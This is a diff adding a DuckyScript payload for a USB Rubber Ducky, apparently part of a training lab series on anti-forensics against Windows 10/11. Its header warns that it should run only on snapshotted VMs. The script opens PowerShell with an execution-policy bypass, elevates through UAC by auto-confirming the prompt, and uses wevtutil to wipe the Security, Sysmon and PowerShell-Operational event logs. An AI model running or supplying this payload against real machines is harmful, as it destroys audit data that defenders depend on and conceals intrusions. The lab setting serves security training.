@@ -1,0 +1,20 @@
+REM ============================================================
+REM Lab 14: Anti-Forensics - Clearing Your Own Tracks
+REM Target: Windows 10/11, USB Rubber Ducky (DuckyScript 3.0)
+REM
+REM WARNING: Run only against an isolated, snapshotted VM.
+REM See DuckyLabs/README.md for ground rules. This payload
+REM destroys log data that CANNOT be recovered by cleanup.ps1 -
+REM the only reset is a VM snapshot revert.
+REM
+REM Effect: elevates via UAC (same pattern as Lab 08), then clears
+REM the Security, Sysmon, and PowerShell-Operational event logs.
+REM ============================================================
+
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -Exec Bypass "saps cmd '/C wevtutil cl Security & wevtutil cl \"Microsoft-Windows-Sysmon/Operational\" & wevtutil cl \"Microsoft-Windows-PowerShell/Operational\"' -Verb RunAs"
+ENTER
+DELAY 1000
+ALT y
